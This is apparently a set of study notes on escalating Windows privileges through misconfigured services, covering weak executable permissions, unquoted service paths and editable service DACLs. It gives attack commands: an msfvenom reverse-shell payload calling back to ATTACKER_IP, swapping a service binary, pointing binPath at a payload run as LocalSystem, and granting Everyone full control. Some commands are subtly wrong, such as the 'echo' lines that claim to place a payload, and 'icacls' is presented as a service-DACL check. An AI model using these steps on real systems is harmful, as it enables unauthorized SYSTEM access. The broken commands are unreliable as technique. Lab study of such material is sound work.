Windows services are managed by the **Service Control Manager** (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.

Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.

#### **<mark style="background: #FF5582A6;">Windows Services</mark>:**

- **<mark style="background: #BBFABBA6;">Service Control Manager (SCM</mark>):** Manages services, their states, and configurations on Windows.
- **<mark style="background: #BBFABBA6;">Service Structure</mark>:**
  - Associated executable run by SCM.
  - Executables must implement special functions to interact with SCM.
  - Specifies user account under which the service runs.

```powershell
# Example: Check service configuration
sc qc [ServiceName]

# Example: Check service registry configuration
reg query HKLM\SYSTEM\CurrentControlSet\Services\[ServiceName]
```

- **<mark style="background: #FF5582A6;">Discretionary Access Control List (DACL)</mark>:**
  - Defines permissions (start, stop, etc.) for services.
  - Located in Registry under `Security` subkey.

```powershell
# Example: Check DACL for a service
icacls C:\Path\To\Service\Executable
```

- **<mark style="background: #FF5582A6;">Insecure Permissions on Service Executable</mark>:**
  - Exploitable if executable has weak permissions.
  - Example using `icacls` to check and overwrite executable.

```powershell
# Example: Check and modify permissions on service executable
icacls C:\Path\To\Service\Executable
echo C:\Path\To\Payload.exe > C:\Path\To\Service\Executable
```

- **<mark style="background: #FF5582A6;">Exploitation</mark>:**
  - Generate payload with `msfvenom`.
  - Replace service executable.
  - Restart service to execute payload.

```bash
# Example: Generate payload with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

# Example: Move payload to service executable location
move C:\Path\To\Payload.exe C:\Path\To\Service\Executable

# Example: Restart service
sc stop [ServiceName]
sc start [ServiceName]
```

#### **<mark style="background: #FF5582A6;">Unquoted Service Paths</mark>:**

- **<mark style="background: #FF5582A6;">Behavioral Quirks</mark>:**
  - Unquoted paths lead to ambiguous command interpretation.
  - SCM searches for binaries in specific order.
  
```powershell
# Example: Check service configuration for quoted paths
sc qc "ServiceName"
```

- **<mark style="background: #FF5582A6;">Exploitation</mark>:**
  - Exploit writable directories or misconfigured permissions.
  - Example: Create executable in a writable directory.
  - Move executable to trigger service execution.

```powershell
# Example: Create executable in writable directory
echo C:\Path\To\Payload.exe > C:\Writable\Directory\Executable.exe

# Example: Move executable to trigger service execution
move C:\Writable\Directory\Executable.exe "C:\Program Files\Service\Executable.exe"
```

#### **<mark style="background: #FF5582A6;">Insecure Service Permissions</mark>:**

- **<mark style="background: #FF5582A6;">Service DACL Exploration</mark>:**
  - Check DACL with tools like <mark style="background: #D2B3FFA6;">Accesschk</mark>.
  
```powershell
# Example: Check DACL for a service
C:\Tools\AccessChk\accesschk64.exe -qlc [ServiceName]
```

- **<mark style="background: #FF5582A6;">Exploitation</mark>:**
  - Modify service configuration.
  - Granting Everyone full access allows manipulation.
  - Example: Change service executable and restart to gain SYSTEM privileges.

```powershell
# Example: Modify service configuration to use a different executable
sc config [ServiceName] binPath= "C:\Path\To\Payload.exe" obj= LocalSystem

# Grating full permission
icacls C:\Path\To\Payload /grant Everyone:F

# Example: Restart service
sc stop [ServiceName]
sc start [ServiceName]
```

**<mark style="background: #FF5582A6;">Note</mark>:**
- Each vector targets service-related vulnerabilities for privilege escalation.
- Understand service configurations, DACL, and executable paths.
- Exploitation often involves payload generation, directory manipulation, and service restarts.